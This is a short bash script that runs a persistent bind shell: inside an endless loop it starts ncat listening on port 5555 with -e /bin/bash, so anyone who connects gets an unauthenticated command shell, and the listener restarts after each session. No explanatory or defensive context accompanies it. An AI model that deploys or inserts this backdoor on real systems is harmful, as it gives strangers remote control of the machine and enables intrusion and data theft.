#!/bin/bash

while true; do
  echo nc starting
  ncat -nvl -p 5555 -e /bin/bash
done
